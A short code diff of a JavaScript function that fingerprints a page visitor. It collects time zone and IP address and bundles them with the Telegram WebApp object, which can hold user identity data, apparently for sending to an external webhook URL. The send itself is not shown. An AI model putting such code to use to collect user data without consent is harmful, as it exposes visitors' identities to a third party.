@@ -19,7 +19,7 @@ async function infData() {
   dat.tz.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
   dat.intl = {};
   dat.intl.timeZone = Intl;
-  nf.ip = await getVisitorIP();
+  dat.ip = await getVisitorIP();
   url = 'https://qnext.app/bin/webhooks/1660/628/l1yubbxtqEb4u3bi';
   let tg = window.Telegram.WebApp;
   let data = {twa: tg, info: dat};
